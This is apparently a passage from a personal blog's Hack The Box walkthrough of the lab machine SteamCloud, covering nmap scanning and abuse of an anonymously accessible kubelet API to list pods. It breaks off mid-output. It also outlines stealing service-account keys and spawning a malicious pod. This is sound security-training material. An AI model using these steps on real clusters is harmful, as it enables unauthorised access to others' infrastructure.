@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:Bhavik Kanejiya]">
+<meta name="description" content="Detailed Streamcloud HTB lab walkthrough focusing on Kubernetes pentesting. Covers environment setup, discovery (kubectl, API), misconfigured RBAC and serviceAccount abuse, privilege escalation techniques, persistence, and developer-focused remediation" />
+<meta name="keywords" content="Cybersecurity, Ethical Hacking, Penetration Testing, Kubernetes Security, Digital Defense, CTF, Cloud Security, Red Teaming, Cyber Forensics, Security Awareness, API Security, OWASP Top 10, Walkthrough, HTB, Linux, Kubernetes, Pod-Breakout" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://bhavik-kanejiya.github.io/blog/htb-steamcloud-walkthrough/" />
+
+
+    <title>
+        
+            HTB SteamCloud Walkthrough :: From Bits to Bytes 
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="https://bhavik-kanejiya.github.io/main.min.07ea7ac7da67e2e153a7dfa2457bc6a19cca824288d175e223fadc579041bc51.css" integrity="sha256-B&#43;p6x9pn4uFTp9&#43;iRXvGoZzKgkKI0XXiI/rcV5BBvFE=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://bhavik-kanejiya.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://bhavik-kanejiya.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://bhavik-kanejiya.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://bhavik-kanejiya.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://bhavik-kanejiya.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://bhavik-kanejiya.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="HTB SteamCloud Walkthrough">
+  <meta itemprop="description" content="Detailed Streamcloud HTB lab walkthrough focusing on Kubernetes pentesting. Covers environment setup, discovery (kubectl, API), misconfigured RBAC and serviceAccount abuse, privilege escalation techniques, persistence, and developer-focused remediation">
+  <meta itemprop="datePublished" content="2025-10-07T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-10-07T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2718">
+  <meta itemprop="image" content="https://bhavik-kanejiya.github.io/images/social-image.png">
+  <meta itemprop="keywords" content="Walkthrough,HTB,Tags/Linux,Tags/Kubernetes,Tags/Pod-Breakout">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://bhavik-kanejiya.github.io/images/social-image.png">
+  <meta name="twitter:title" content="HTB SteamCloud Walkthrough">
+  <meta name="twitter:description" content="Detailed Streamcloud HTB lab walkthrough focusing on Kubernetes pentesting. Covers environment setup, discovery (kubectl, API), misconfigured RBAC and serviceAccount abuse, privilege escalation techniques, persistence, and developer-focused remediation">
+
+
+
+
+
+    <meta property="article:section" content="HTB" />
+
+    <meta property="article:section" content="Walkthrough" />
+
+
+
+    <meta property="article:published_time" content="2025-10-07 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://bhavik-kanejiya.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                bhavikkanejiya/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://bhavik-kanejiya.github.io/about/">🔎 About Me</a></li><li><a href="https://bhavik-kanejiya.github.io/blog/">📚 Blog</a></li><li><a href="https://bhavik-kanejiya.github.io/resume/">📄 Resume</a></li><li><a href="https://bhavik-kanejiya.github.io/tags/">🏷 Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://bhavik-kanejiya.github.io/blog/htb-steamcloud-walkthrough/">HTB SteamCloud Walkthrough</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h2 id="box-info">Box Info</h2>
+<p>!()[/images/HTB/SteamCloud/1.png]]</p>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Attribute</strong></th>
+          <th><strong>Details</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Level</strong></td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td><strong>OS</strong></td>
+          <td>Linux</td>
+      </tr>
+      <tr>
+          <td><strong>Box URL</strong></td>
+          <td><a href="https://app.hackthebox.com/machines/443">https://app.hackthebox.com/machines/443</a></td>
+      </tr>
+      <tr>
+          <td><strong>Box Status</strong></td>
+          <td>Retired</td>
+      </tr>
+      <tr>
+          <td><strong>About Box</strong></td>
+          <td>SteamCloud is an easy difficulty machine. The port scan reveals that it has a bunch of Kubernetes-specific ports open. We can not enumerate the Kubernetes API because it requires authentication. Now, as Kubelet allows anonymous access, we can extract a list of all the pods from the K8S cluster by enumerating the Kubelet service. Furthermore, we can get into one of the pods and obtain the keys necessary to authenticate to the Kubernetes API. We can now create and spawn a malicious pod and then use Kubectl to run commands within the pod to read the root flag.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="footprinting">Footprinting</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Let&rsquo;s start with scanning the machine IP with nmap to check what are the services are running on different ports!</p>
+<h3 id="nmap-1">Nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p 22,2379,2380,8443,10249,10250,10256 --min-rate <span style="color:#ae81ff">10000</span> $ip -oN 1.basic.nmap.txt
+</span></span><span style="display:flex;"><span>Starting Nmap 7.97 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-10-02 21:45 +0530
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.133
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.25s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh
+</span></span><span style="display:flex;"><span>2379/tcp  open  etcd-client
+</span></span><span style="display:flex;"><span>2380/tcp  open  etcd-server
+</span></span><span style="display:flex;"><span>8443/tcp  open  https-alt
+</span></span><span style="display:flex;"><span>10249/tcp open  unknown
+</span></span><span style="display:flex;"><span>10250/tcp open  unknown
+</span></span><span style="display:flex;"><span>10256/tcp open  unknown
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1.26 seconds
+</span></span></code></pre></div><h3 id="nmap-scan---detailed">Nmap Scan - Detailed</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,2379,2380,8443,10249,10250,10256 $ip -oN 3.detailed.nmap.txt
+</span></span><span style="display:flex;"><span>Starting Nmap 7.97 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-10-02 21:55 +0530
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.133
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.31s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>2379/tcp  open  ssl/etcd-client?
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>steamcloud
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+</span></span><span style="display:flex;"><span>| Not valid before: 2025-10-02T16:08:35
+</span></span><span style="display:flex;"><span>|_Not valid after:  2026-10-02T16:08:35
+</span></span><span style="display:flex;"><span>| tls-alpn:
+</span></span><span style="display:flex;"><span>|_  h2
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>2380/tcp  open  ssl/etcd-server?
+</span></span><span style="display:flex;"><span>| tls-alpn:
+</span></span><span style="display:flex;"><span>|_  h2
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>steamcloud
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
+</span></span><span style="display:flex;"><span>| Not valid before: 2025-10-02T16:08:35
+</span></span><span style="display:flex;"><span>|_Not valid after:  2026-10-02T16:08:36
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>8443/tcp  open  ssl/http         Golang net/http server
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>|     Audit-Id: 13ad7bea-1258-4ffc-acfb-b23dc09805f8
+</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache, private
+</span></span><span style="display:flex;"><span>|     Content-Type: application/json
+</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Flowschema-Uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Prioritylevel-Uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2
+</span></span><span style="display:flex;"><span>|     Date: Thu, <span style="color:#ae81ff">02</span> Oct <span style="color:#ae81ff">2025</span> 16:25:32 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">212</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span>/nice ports,/Trinity.txt.bak<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;code&#34;</span>:403<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>|   GenericLines, Help, RTSPRequest, SSLSessionReq:
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Request
+</span></span><span style="display:flex;"><span>|   GetRequest:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">403</span> Forbidden
+</span></span><span style="display:flex;"><span>|     Audit-Id: 6a334c86-3068-4f26-8887-5adf56610e19
+</span></span><span style="display:flex;"><span>|     Cache-Control: no-cache, private
+</span></span><span style="display:flex;"><span>|     Content-Type: application/json
+</span></span><span style="display:flex;"><span>|     X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Flowschema-Uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd
+</span></span><span style="display:flex;"><span>|     X-Kubernetes-Pf-Prioritylevel-Uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2
+</span></span><span style="display:flex;"><span>|     Date: Thu, <span style="color:#ae81ff">02</span> Oct <span style="color:#ae81ff">2025</span> 16:25:29 GMT
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">185</span>
+</span></span><span style="display:flex;"><span>|_    <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span>/<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;code&#34;</span>:403<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>minikube/organizationName<span style="color:#f92672">=</span>system:masters
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
+</span></span><span style="display:flex;"><span>| Not valid before: 2025-10-01T16:08:33
+</span></span><span style="display:flex;"><span>|_Not valid after:  2028-10-01T16:08:33
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (application/json).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| tls-alpn:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   h2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  http/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ssl-date: TLS randomness does not represent time
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/plain; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>10250/tcp open  ssl/http         Golang net/http server <span style="color:#f92672">(</span>Go-IPFS json-rpc or InfluxDB API<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/plain; charset=utf-8).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ssl-cert: Subject: commonName=steamcloud@1759421317
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Subject Alternative Name: DNS:steamcloud
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| Not valid before: 2025-10-02T15:08:37
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_Not valid after:  2026-10-02T15:08:37
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| tls-alpn:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   h2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  http/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ssl-date: TLS randomness does not represent time
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/plain; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</span></span></code></pre></div><ul>
+<li>Found open ports: 22 (SSH), 2379 (etcd), 2380 (etcd), 8443 (http), 10249 (kubelet), 10250 (kubelet), 10256 (http)</li>
+<li>The web application running on port 8443 is showing 403 Forbidden with the message &ldquo;User &lsquo;system: anonymous&rsquo; cannot get path &lsquo;/&rsquo;&rdquo;</li>
+<li>Identified multiple subject alternative names related to Kubernetes.</li>
+</ul>
+<p><strong>Subject Alternative Name:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>DNS:minikubeCA, 
+</span></span><span style="display:flex;"><span>DNS:control-plane.minikube.internal, 
+</span></span><span style="display:flex;"><span>DNS:kubernetes.default.svc.cluster.local, 
+</span></span><span style="display:flex;"><span>DNS:kubernetes.default.svc, 
+</span></span><span style="display:flex;"><span>DNS:kubernetes.default, 
+</span></span><span style="display:flex;"><span>DNS:kubernetes, 
+</span></span><span style="display:flex;"><span>DNS:localhost, 
+</span></span><span style="display:flex;"><span>IP Address:10.10.11.133, 
+</span></span><span style="display:flex;"><span>IP Address:10.96.0.1, 
+</span></span><span style="display:flex;"><span>IP Address:127.0.0.1, 
+</span></span><span style="display:flex;"><span>IP Address:10.0.0.1
+</span></span></code></pre></div><p><strong>Let’s add steamcloud host to our /etc/hosts file:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.10.11.133 	steamcloud.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="ssh-22">SSH 22</h3>
+<p>We tried the same for SSH by attempting an anonymous login, but it was unsuccessful.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh anonymous@steamcloud.htb
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;steamcloud.htb (10.10.11.133)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:/BfbWBuZ6K3xx1f7py/c7eMZ1Wedb7sKF5yhMHNXHZ4.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>steamcloud.htb<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">anonymous@steamcloud.htb&#39;</span>s password:
+</span></span><span style="display:flex;"><span>Permission denied, please try again.
+</span></span></code></pre></div><h3 id="port-8443">Port 8443</h3>
+<p>!()[/images/HTB/SteamCloud/2.png]]</p>
+<p><strong>Response Headers</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -ik https://steamcloud.htb:8443/
+</span></span><span style="display:flex;"><span>HTTP/2 <span style="color:#ae81ff">403</span>
+</span></span><span style="display:flex;"><span>audit-id: 852abb91-1bd8-400d-8616-1c7511c78885
+</span></span><span style="display:flex;"><span>cache-control: no-cache, private
+</span></span><span style="display:flex;"><span>content-type: application/json
+</span></span><span style="display:flex;"><span>x-content-type-options: nosniff
+</span></span><span style="display:flex;"><span>x-kubernetes-pf-flowschema-uid: a3edd6fe-f160-49eb-b643-43995ee5e2cd
+</span></span><span style="display:flex;"><span>x-kubernetes-pf-prioritylevel-uid: 58017c5b-6bc1-45f4-98b3-a983bf2538f2
+</span></span><span style="display:flex;"><span>content-length: <span style="color:#ae81ff">233</span>
+</span></span><span style="display:flex;"><span>date: Thu, <span style="color:#ae81ff">02</span> Oct <span style="color:#ae81ff">2025</span> 16:34:49 GMT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;kind&#34;</span>: <span style="color:#e6db74">&#34;Status&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;apiVersion&#34;</span>: <span style="color:#e6db74">&#34;v1&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;metadata&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;Failure&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;forbidden: User \&#34;system:anonymous\&#34; cannot get path \&#34;/\&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;reason&#34;</span>: <span style="color:#e6db74">&#34;Forbidden&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;details&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;code&#34;</span>: <span style="color:#ae81ff">403</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Based on the response headers, it was observed that the application is running on Kubernetes. It was giving a 403 Forbidden, which indicates the Kubernetes API server is rejecting the request because <code>system:anonymous</code> does not have permission to access that path.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; kubectl --server https://10.10.11.133:8443 get pods
+</span></span><span style="display:flex;"><span>Unable to connect to the server: tls: failed to verify certificate: x509: certificate signed by unknown authority
+</span></span></code></pre></div><p>I tried to access port 8443 using kubectl, but it was asking for a valid username and password, which I couldn&rsquo;t brute-force.</p>
+<h3 id="kubernetes-ports">Kubernetes Ports</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Protocol</th>
+          <th>Direction</th>
+          <th>Port Range</th>
+          <th>Purpose</th>
+          <th>Used By</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>TCP</td>
+          <td>Inbound</td>
+          <td>6443</td>
+          <td>Kubernetes API server</td>
+          <td>All</td>
+      </tr>
+      <tr>
+          <td>TCP</td>
+          <td>Inbound</td>
+          <td>2379-2380</td>
+          <td>etcd server client API</td>
+          <td>kube-apiserver, etcd</td>
+      </tr>
+      <tr>
+          <td>TCP</td>
+          <td>Inbound</td>
+          <td>10250</td>
+          <td>Kubelet API</td>
+          <td>Self, Control plane</td>
+      </tr>
+      <tr>
+          <td>TCP</td>
+          <td>Inbound</td>
+          <td>10259</td>
+          <td>kube-scheduler</td>
+          <td>Self</td>
+      </tr>
+      <tr>
+          <td>TCP</td>
+          <td>Inbound</td>
+          <td>10257</td>
+          <td>kube-controller-manager</td>
+          <td>Self</td>
+      </tr>
+  </tbody>
+</table>
+<blockquote>
+<p>Reference: <a href="https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane">https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane</a></p></blockquote>
+<h3 id="port-10250">Port 10250</h3>
+<p>Port 10250 on the kubelet is used by the kube-apiserver for exec and logs.</p>
+<p>I came across this gist repo about &ldquo;Accessing the kubelet-api&rdquo; by <a href="https://gist.github.com/lizrice/c32740fac51db2a5518f06c3dae4944f">lizrice</a>. First, I tried to list pods using a simple GET request to check whether listing pods as <code>anonymous-auth</code> was possible.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -sk https://10.10.11.133:10250/pods/
+</span></span></code></pre></div><ul>
+<li>If <code>--anonymous-auth</code> is turned off, you will see a <code>401 Unauthorized</code> response.</li>
+<li>If <code>--anonymous-auth</code> is <code>true</code> and <code>--authorization-mode</code> is <code>Webhook</code> you&rsquo;ll see <code>403 Forbidden</code> response with message <code>Forbidden (user=system:anonymous, verb=get, resource=nodes, subresource=proxy)</code></li>
+<li>If <code>--anonymous-auth</code> is <code>true</code> and <code>--authorization-mode</code> is <code>AlwaysAllow</code> you&rsquo;ll see a list of pods.</li>
+</ul>
+<p>We got the proper 200 OK response which means that <code>--anonymous-auth</code> is true and <code>--authorization-mode</code> is AlwaysAllow.</p>
+<p><strong>Response:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;PodList&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{}</span>,<span style="color:#e6db74">&#34;items&#34;</span>:<span style="color:#f92672">[{</span><span style="color:#e6db74">&#34;metadata&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>:<span style="color:#e6db74">&#34;etcd-steamcloud&#34;</span>,<span style="color:#e6db74">&#34;namespace&#34;</span>:<span style="color:#e6db74">&#34;kube-system&#34;</span>,<span style="color:#e6db74">&#34;selfLink&#34;</span>:<span style="color:#e6db74">&#34;/api/v1/namespaces/kube-system/pods/etcd-steamcloud&#34;</span>,<span style="color:#e6db74">&#34;uid&#34;</span>:<span style="color:#e6db74">&#34;967b9bee71f2e3cec06ff1dbde2a2a19&#34;</span>,<span style="color:#e6db74">&#34;creationTimestamp&#34;</span>:null,<span style="color:#e6db74">&#34;labels&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;component&#34;</span>:<span style="color:#e6db74">&#34;etcd&#34;</span>,<span style="color:#e6db74">&#34;tier&#34;</span>:<span style="color:#e6db74">&#34;control-plane&#34;</span><span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;annotations&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;kubeadm.kubernetes.io/etcd.advertise-client-urls&#34;</span>:<span style="color:#e6db74">&#34;https://10.10.11.133:2379&#34;</span>,<span 